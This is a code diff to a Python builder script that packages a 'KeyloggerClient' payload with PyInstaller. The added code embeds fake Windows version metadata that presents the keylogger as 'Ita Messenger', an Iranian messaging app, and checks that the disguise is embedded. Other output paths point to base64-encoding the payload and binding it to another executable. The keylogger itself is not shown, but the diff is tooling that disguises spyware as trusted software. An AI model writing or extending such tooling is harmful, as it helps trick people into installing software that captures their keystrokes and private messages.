@@ -30,6 +30,55 @@ class Builder:
         self.b64_output = os.path.join(self.output_dir, "KeyloggerClient_b64.txt")
         self.bind_output = os.path.join(self.output_dir, "binded_output.exe")
         self.is_ci = os.getenv('CI') or os.getenv('GITHUB_ACTIONS')
+        self.version_file = "version_info.py"
+
+    def _create_version_info(self):
+        """Create version info file for digital signature"""
+        version_content = '''# version_info.py
+from PyInstaller.utils.win32.versioninfo import VSVersionInfo, StringTable, StringStruct, VarFileInfo, VarStruct, FixedFileInfo
+
+VSVersionInfo(
+  ffi=FixedFileInfo(
+    filevers=(1, 1, 0, 0),
+    prodvers=(1, 1, 0, 0),
+    mask=0x3f,
+    flags=0x0,
+    OS=0x40004,
+    fileType=0x1,
+    subtype=0x0,
+    date=(0, 0)
+  ),
+  kids=[
+    StringTable(
+      '040904B0',
+      [
+        StringStruct('CompanyName', 'Ita Messenger Co.'),
+        StringStruct('FileDescription', 'Ita Messenger Service'),
+        StringStruct('FileVersion', '1.1.0.0'),
+        StringStruct('InternalName', 'ItaMessenger'),
+        StringStruct('LegalCopyright', 'Copyright 2024 Ita Messenger Co. All rights reserved.'),
+        StringStruct('OriginalFilename', 'KeyloggerClient.exe'),
+        StringStruct('ProductName', 'Ita Messenger'),
+        StringStruct('ProductVersion', '1.1.0.0'),
+        StringStruct('Comments', 'Ita is a multi-platform instant messaging service based on cloud computing. Ita is the most popular messaging app in Iran and is considered the Iranian version of Telegram.')
+      ]
+    ), 
+    VarFileInfo([VarStruct('Translation', [0x409, 1200])])
+  ]
+)'''
+        
+        with open(self.version_file, 'w', encoding='utf-8') as f:
+            f.write(version_content)
+        print(f"Version info file created: {self.version_file}")
+
+    def _check_icon(self):
+        """Check if icon exists"""
+        if not os.path.exists('icon.ico'):
+            print("Warning: icon.ico not found in root directory")
+            logging.warning("icon.ico not found in root directory")
+            return False
+        print("Icon.ico found successfully")
+        return True
 
     def install_requirements(self):
         """Install dependencies from requirements.txt if it exists."""
@@ -62,10 +111,16 @@ class Builder:
             if not os.path.exists(self.spec_file):
                 raise Exception(f"Spec file not found: {self.spec_file}")
     
+            # Check for icon
+            self._check_icon()
+            
+            # Create version info file
+            self._create_version_info()
+    
             # Create output directory if it doesn't exist
             os.makedirs(self.output_dir, exist_ok=True)
     
-            # Build using spec file
+            # Build using spec file - only basic options
             pyinstaller_cmd = [
                 "pyinstaller",
                 "--noconfirm",
@@ -76,17 +131,30 @@ class Builder:
             print(f"Executing PyInstaller with spec file: {self.spec_file}")
             logging.debug(f"PyInstaller command: {' '.join(pyinstaller_cmd)}")
             
-            # Run PyInstaller
-            result = subprocess.run(pyinstaller_cmd, check=True, capture_output=True, text=True)
+            # Run PyInstaller with correct encoding
+            result = subprocess.run(
+                pyinstaller_cmd, 
+                check=True, 
+                capture_output=True, 
+                text=True,
+                encoding='utf-8',
+                errors='ignore'
+            )
             
             if result.stdout:
-                print("PyInstaller stdout:", result.stdout[:500])
+                print("PyInstaller completed successfully")
             if result.stderr:
-                print("PyInstaller stderr:", result.stderr[:500])
+                print("PyInstaller warnings:", result.stderr[-500:])
 
             # Check if executable was created
             if not os.path.exists(self.payload_exe):
-                raise Exception(f"Payload executable not found: {self.payload_exe}")
+                # Try alternative path
+                alt_path = os.path.join("dist", "KeyloggerClient", "KeyloggerClient.exe")
+                if os.path.exists(alt_path):
+                    shutil.move(alt_path, self.payload_exe)
+                    shutil.rmtree(os.path.join("dist", "KeyloggerClient"))
+                else:
+                    raise Exception(f"Payload executable not found: {self.payload_exe}")
             
             # Get file size
             file_size = os.path.getsize(self.payload_exe)
@@ -94,6 +162,18 @@ class Builder:
             
             print(f"Payload built successfully: {self.payload_exe}")
             print(f"File size: {file_size_mb:.2f} MB")
+            
+            # Check version info in executable
+            try:
+                import pefile
+                pe = pefile.PE(self.payload_exe)
+                if hasattr(pe, 'VS_VERSIONINFO'):
+                    print("✓ Version info successfully embedded in executable")
+                else:
+                    print("⚠ Warning: Version info may not be embedded")
+            except ImportError:
+                print("ℹ pefile not available, skipping version info verification")
+            
             logging.info(f"Payload built successfully: {self.payload_exe} ({file_size_mb:.2f} MB)")
 
         except subprocess.CalledProcessError as e:
